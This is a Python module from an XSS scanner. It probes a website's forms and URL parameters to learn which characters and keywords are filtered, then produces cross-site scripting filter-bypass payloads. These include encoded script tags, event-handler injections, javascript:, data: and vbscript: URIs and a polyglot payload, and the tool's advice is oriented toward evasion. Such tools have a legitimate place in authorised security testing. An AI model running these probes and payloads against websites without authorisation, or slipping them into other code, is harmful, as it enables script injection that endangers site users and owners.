#!/usr/bin/env python3
"""
Character Filter Analyzer for XSS Scanner
Advanced character filtering detection and bypass techniques
"""

import re
import time
import string
import random
from typing import Dict, List, Set, Tuple, Optional
from urllib.parse import quote, unquote, quote_plus
import requests
from bs4 import BeautifulSoup

class CharacterFilterAnalyzer:
    """Advanced character filtering analysis and bypass engine"""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.filtered_chars = set()
        self.allowed_chars = set()
        self.bypass_techniques = {}
        self.filter_patterns = {}
        
        # Character sets for testing
        self.dangerous_chars = [
            '<', '>', '"', "'", '&', ';', '(', ')', '{', '}', '[', ']',
            '=', '+', '-', '*', '/', '\\', '|', '^', '~', '`', '!', '@',
            '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=',
            '{', '}', '[', ']', '|', '\\', ':', ';', '"', "'", '<', '>',
            ',', '.', '?', '/', ' ', '\t', '\n', '\r'
        ]
        
        self.xss_keywords = [
            'script', 'alert', 'javascript', 'onload', 'onerror', 'onclick',
            'document', 'window', 'eval', 'function', 'var', 'let', 'const',
            'iframe', 'img', 'svg', 'object', 'embed', 'form', 'input',
            'style', 'link', 'meta', 'base', 'body', 'html', 'head',
            'onmouseover', 'onfocus', 'onblur', 'onchange', 'onsubmit',
            'onreset', 'onselect', 'onkeydown', 'onkeyup', 'onkeypress',
            'onmousedown', 'onmouseup', 'onmousemove', 'onmouseout',
            'onmouseenter', 'onmouseleave', 'oncontextmenu', 'ondblclick',
            'onwheel', 'onabort', 'oncanplay', 'oncanplaythrough',
            'ondurationchange', 'onemptied', 'onended', 'onloadeddata',
            'onloadedmetadata', 'onloadstart', 'onpause', 'onplay',
            'onplaying', 'onprogress', 'onratechange', 'onseeked',
            'onseeking', 'onstalled', 'onsuspend', 'ontimeupdate',
            'onvolumechange', 'onwaiting', 'expression', 'url(',
            'javascript:', 'vbscript:', 'data:', 'about:'
        ]
        
        # Bypass techniques
        self.bypass_methods = {
            'url_encoding': self._url_encode,
            'html_encoding': self._html_encode,
            'unicode_encoding': self._unicode_encode,
            'hex_encoding': self._hex_encode,
            'octal_encoding': self._octal_encode,
            'case_variation': self._case_variation,
            'whitespace_manipulation': self._whitespace_manipulation,
            'comment_injection': self._comment_injection,
            'string_concatenation': self._string_concatenation,
            'template_literals': self._template_literals,
            'function_construction': self._function_construction,
            'eval_construction': self._eval_construction,
            'dom_manipulation': self._dom_manipulation,
            'event_handler_bypass': self._event_handler_bypass,
            'css_expression_bypass': self._css_expression_bypass,
            'javascript_protocol_bypass': self._javascript_protocol_bypass,
            'data_uri_bypass': self._data_uri_bypass,
            'vbscript_bypass': self._vbscript_bypass,
            'svg_bypass': self._svg_bypass,
            'iframe_bypass': self._iframe_bypass
        }
        
    def analyze_character_filters(self, url: str, input_point: Dict) -> Dict:
        """Analyze character filtering on input point"""
        print(f"🔍 Analyzing character filters for: {url}")
        
        analysis_result = {
            'url': url,
            'input_point': input_point,
            'filtered_chars': [],
            'allowed_chars': [],
            'filtered_keywords': [],
            'allowed_keywords': [],
            'bypass_techniques': {},
            'filter_patterns': {},
            'recommendations': []
        }
        
        # Test individual characters
        char_analysis = self._test_character_filtering(url, input_point)
        analysis_result['filtered_chars'] = char_analysis['filtered']
        analysis_result['allowed_chars'] = char_analysis['allowed']
        
        # Test XSS keywords
        keyword_analysis = self._test_keyword_filtering(url, input_point)
        analysis_result['filtered_keywords'] = keyword_analysis['filtered']
        analysis_result['allowed_keywords'] = keyword_analysis['allowed']
        
        # Analyze filter patterns
        pattern_analysis = self._analyze_filter_patterns(analysis_result)
        analysis_result['filter_patterns'] = pattern_analysis
        
        # Generate bypass techniques
        bypass_analysis = self._generate_bypass_techniques(analysis_result)
        analysis_result['bypass_techniques'] = bypass_analysis
        
        # Generate recommendations
        recommendations = self._generate_recommendations(analysis_result)
        analysis_result['recommendations'] = recommendations
        
        return analysis_result
        
    def _test_character_filtering(self, url: str, input_point: Dict) -> Dict:
        """Test individual character filtering"""
        filtered = []
        allowed = []
        
        for char in self.dangerous_chars:
            if self._test_character(url, input_point, char):
                allowed.append(char)
            else:
                filtered.append(char)
                
        return {'filtered': filtered, 'allowed': allowed}
        
    def _test_keyword_filtering(self, url: str, input_point: Dict) -> Dict:
        """Test XSS keyword filtering"""
        filtered = []
        allowed = []
        
        for keyword in self.xss_keywords:
            if self._test_keyword(url, input_point, keyword):
                allowed.append(keyword)
            else:
                filtered.append(keyword)
                
        return {'filtered': filtered, 'allowed': allowed}
        
    def _test_character(self, url: str, input_point: Dict, char: str) -> bool:
        """Test if a character is allowed"""
        try:
            if input_point['type'] == 'form':
                return self._test_form_character(url, input_point, char)
            elif input_point['type'] == 'url_params':
                return self._test_url_character(url, input_point, char)
            return False
        except Exception:
            return False
            
    def _test_keyword(self, url: str, input_point: Dict, keyword: str) -> bool:
        """Test if a keyword is allowed"""
        try:
            if input_point['type'] == 'form':
                return self._test_form_keyword(url, input_point, keyword)
            elif input_point['type'] == 'url_params':
                return self._test_url_keyword(url, input_point, keyword)
            return False
        except Exception:
            return False
            
    def _test_form_character(self, url: str, form: Dict, char: str) -> bool:
        """Test character in form input"""
        try:
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name']:
                    if input_field['type'] in ['text', 'email', 'search', 'url', 'textarea']:
                        form_data[input_field['name']] = char
                    else:
                        form_data[input_field['name']] = input_field.get('value', '')
                        
            if not form_data:
                return False
                
            form_url = form['action']
            if not form_url.startswith(('http://', 'https://')):
                from urllib.parse import urljoin
                form_url = urljoin(form['url'], form_url)
                
            if form['method'] == 'POST':
                response = self.session.post(form_url, data=form_data, timeout=5)
            else:
                response = self.session.get(form_url, params=form_data, timeout=5)
                
            # Check if character was filtered
            return char in response.text
            
        except Exception:
            return False
            
    def _test_url_character(self, url: str, url_params: Dict, char: str) -> bool:
        """Test character in URL parameter"""
        try:
            test_params = url_params['params'].copy()
            first_param = list(test_params.keys())[0]
            test_params[first_param] = char
            
            response = self.session.get(url_params['url'], params=test_params, timeout=5)
            
            # Check if character was filtered
            return char in response.text
            
        except Exception:
            return False
            
    def _test_form_keyword(self, url: str, form: Dict, keyword: str) -> bool:
        """Test keyword in form input"""
        try:
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name']:
                    if input_field['type'] in ['text', 'email', 'search', 'url', 'textarea']:
                        form_data[input_field['name']] = keyword
                    else:
                        form_data[input_field['name']] = input_field.get('value', '')
                        
            if not form_data:
                return False
                
            form_url = form['action']
            if not form_url.startswith(('http://', 'https://')):
                from urllib.parse import urljoin
                form_url = urljoin(form['url'], form_url)
                
            if form['method'] == 'POST':
                response = self.session.post(form_url, data=form_data, timeout=5)
            else:
                response = self.session.get(form_url, params=form_data, timeout=5)
                
            # Check if keyword was filtered
            return keyword.lower() in response.text.lower()
            
        except Exception:
            return False
            
    def _test_url_keyword(self, url: str, url_params: Dict, keyword: str) -> bool:
        """Test keyword in URL parameter"""
        try:
            test_params = url_params['params'].copy()
            first_param = list(test_params.keys())[0]
            test_params[first_param] = keyword
            
            response = self.session.get(url_params['url'], params=test_params, timeout=5)
            
            # Check if keyword was filtered
            return keyword.lower() in response.text.lower()
            
        except Exception:
            return False
            
    def _analyze_filter_patterns(self, analysis_result: Dict) -> Dict:
        """Analyze filtering patterns"""
        patterns = {
            'character_patterns': [],
            'keyword_patterns': [],
            'filter_type': 'unknown',
            'filter_strength': 'unknown'
        }
        
        filtered_chars = analysis_result['filtered_chars']
        filtered_keywords = analysis_result['filtered_keywords']
        
        # Analyze character patterns
        if '<' in filtered_chars and '>' in filtered_chars:
            patterns['character_patterns'].append('html_tags_blocked')
        if '"' in filtered_chars and "'" in filtered_chars:
            patterns['character_patterns'].append('quotes_blocked')
        if '(' in filtered_chars and ')' in filtered_chars:
            patterns['character_patterns'].append('parentheses_blocked')
        if ';' in filtered_chars:
            patterns['character_patterns'].append('semicolon_blocked')
        if '&' in filtered_chars:
            patterns['character_patterns'].append('ampersand_blocked')
            
        # Analyze keyword patterns
        if 'script' in filtered_keywords:
            patterns['keyword_patterns'].append('script_tag_blocked')
        if 'alert' in filtered_keywords:
            patterns['keyword_patterns'].append('alert_function_blocked')
        if 'javascript' in filtered_keywords:
            patterns['keyword_patterns'].append('javascript_protocol_blocked')
        if 'onload' in filtered_keywords or 'onerror' in filtered_keywords:
            patterns['keyword_patterns'].append('event_handlers_blocked')
            
        # Determine filter type
        if len(filtered_chars) > len(analysis_result['allowed_chars']):
            patterns['filter_type'] = 'character_based'
        elif len(filtered_keywords) > len(analysis_result['allowed_keywords']):
            patterns['filter_type'] = 'keyword_based'
        else:
            patterns['filter_type'] = 'mixed'
            
        # Determine filter strength
        total_tests = len(filtered_chars) + len(analysis_result['allowed_chars']) + len(filtered_keywords) + len(analysis_result['allowed_keywords'])
        filtered_total = len(filtered_chars) + len(filtered_keywords)
        
        if filtered_total / total_tests > 0.8:
            patterns['filter_strength'] = 'strong'
        elif filtered_total / total_tests > 0.5:
            patterns['filter_strength'] = 'medium'
        else:
            patterns['filter_strength'] = 'weak'
            
        return patterns
        
    def _generate_bypass_techniques(self, analysis_result: Dict) -> Dict:
        """Generate bypass techniques based on analysis"""
        bypass_techniques = {}
        
        filtered_chars = analysis_result['filtered_chars']
        filtered_keywords = analysis_result['filtered_keywords']
        filter_patterns = analysis_result['filter_patterns']
        
        # Character-based bypasses
        if '<' in filtered_chars or '>' in filtered_chars:
            bypass_techniques['html_tag_bypass'] = [
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
                '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'
            ]
            
        if '"' in filtered_chars or "'" in filtered_chars:
            bypass_techniques['quote_bypass'] = [
                '&quot;alert(1)&quot;',
                '&#34;alert(1)&#34;',
                '%22alert(1)%22',
                '\\x22alert(1)\\x22',
                '\\u0022alert(1)\\u0022'
            ]
            
        if ';' in filtered_chars:
            bypass_techniques['semicolon_bypass'] = [
                'alert(1)',
                'alert`1`',
                'alert(String.fromCharCode(49))',
                'eval("alert(1)")',
                'Function("alert(1)")()'
            ]
            
        # Keyword-based bypasses
        if 'script' in filtered_keywords:
            bypass_techniques['script_bypass'] = [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)></iframe>',
                '<object data=javascript:alert(1)></object>',
                '<embed src=javascript:alert(1)>'
            ]
            
        if 'alert' in filtered_keywords:
            bypass_techniques['alert_bypass'] = [
                'confirm(1)',
                'prompt(1)',
                'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
                'Function("alert(1)")()',
                'setTimeout("alert(1)",0)'
            ]
            
        if 'javascript' in filtered_keywords:
            bypass_techniques['javascript_bypass'] = [
                'vbscript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'about:blank',
                'javascript:alert(1)',
                'javascript:alert(String.fromCharCode(49))'
            ]
            
        # Advanced bypasses
        bypass_techniques['advanced_bypass'] = [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)></iframe>',
            '<object data=javascript:alert(1)></object>',
            '<embed src=javascript:alert(1)>',
            '<form><button formaction=javascript:alert(1)>X</button>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>'
        ]
        
        return bypass_techniques
        
    def _generate_recommendations(self, analysis_result: Dict) -> List[str]:
        """Generate recommendations based on analysis"""
        recommendations = []
        
        filter_patterns = analysis_result['filter_patterns']
        bypass_techniques = analysis_result['bypass_techniques']
        
        if filter_patterns['filter_strength'] == 'weak':
            recommendations.append("Weak filtering detected - many bypass techniques available")
            
        if filter_patterns['filter_type'] == 'character_based':
            recommendations.append("Character-based filtering - use encoding techniques")
            
        if filter_patterns['filter_type'] == 'keyword_based':
            recommendations.append("Keyword-based filtering - use alternative functions and tags")
            
        if 'html_tag_bypass' in bypass_techniques:
            recommendations.append("HTML tag filtering detected - use encoding or alternative tags")
            
        if 'script_bypass' in bypass_techniques:
            recommendations.append("Script tag filtering detected - use event handlers or alternative tags")
            
        if 'alert_bypass' in bypass_techniques:
            recommendations.append("Alert function filtering detected - use alternative functions")
            
        if 'javascript_bypass' in bypass_techniques:
            recommendations.append("JavaScript protocol filtering detected - use alternative protocols")
            
        return recommendations
        
    # Bypass method implementations
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return quote(payload)
        
    def _html_encode(self, payload: str) -> str:
        """HTML encode payload"""
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
        
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
        
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
        
    def _octal_encode(self, payload: str) -> str:
        """Octal encode payload"""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
        
    def _case_variation(self, payload: str) -> str:
        """Case variation bypass"""
        return payload.replace('script', 'ScRiPt').replace('alert', 'AlErT')
        
    def _whitespace_manipulation(self, payload: str) -> str:
        """Whitespace manipulation bypass"""
        return payload.replace(' ', '\t').replace(' ', '\n').replace(' ', '\r')
        
    def _comment_injection(self, payload: str) -> str:
        """Comment injection bypass"""
        return f'<!--{payload}-->'
        
    def _string_concatenation(self, payload: str) -> str:
        """String concatenation bypass"""
        return f'"{payload[0]}"+"{payload[1:]}'
        
    def _template_literals(self, payload: str) -> str:
        """Template literals bypass"""
        return f'`{payload}`'
        
    def _function_construction(self, payload: str) -> str:
        """Function construction bypass"""
        return f'Function("{payload}")()'
        
    def _eval_construction(self, payload: str) -> str:
        """Eval construction bypass"""
        return f'eval("{payload}")'
        
    def _dom_manipulation(self, payload: str) -> str:
        """DOM manipulation bypass"""
        return f'document.write("{payload}")'
        
    def _event_handler_bypass(self, payload: str) -> str:
        """Event handler bypass"""
        return f'" onmouseover="{payload}" x="'
        
    def _css_expression_bypass(self, payload: str) -> str:
        """CSS expression bypass"""
        return f'expression({payload})'
        
    def _javascript_protocol_bypass(self, payload: str) -> str:
        """JavaScript protocol bypass"""
        return f'javascript:{payload}'
        
    def _data_uri_bypass(self, payload: str) -> str:
        """Data URI bypass"""
        return f'data:text/html,<script>{payload}</script>'
        
    def _vbscript_bypass(self, payload: str) -> str:
        """VBScript bypass"""
        return f'vbscript:{payload}'
        
    def _svg_bypass(self, payload: str) -> str:
        """SVG bypass"""
        return f'<svg onload="{payload}">'
        
    def _iframe_bypass(self, payload: str) -> str:
        """Iframe bypass"""
        return f'<iframe src="javascript:{payload}"></iframe>'
        
    def generate_bypass_payloads(self, original_payload: str, analysis_result: Dict) -> List[str]:
        """Generate bypass payloads based on analysis"""
        bypass_payloads = []
        
        bypass_techniques = analysis_result['bypass_techniques']
        
        # Apply bypass techniques to original payload
        for technique_name, technique_payloads in bypass_techniques.items():
            for payload in technique_payloads:
                bypass_payloads.append(payload)
                
        # Apply encoding techniques
        for method_name, method_func in self.bypass_methods.items():
            try:
                bypassed = method_func(original_payload)
                bypass_payloads.append(bypassed)
            except Exception:
                continue
                
        return list(set(bypass_payloads))  # Remove duplicates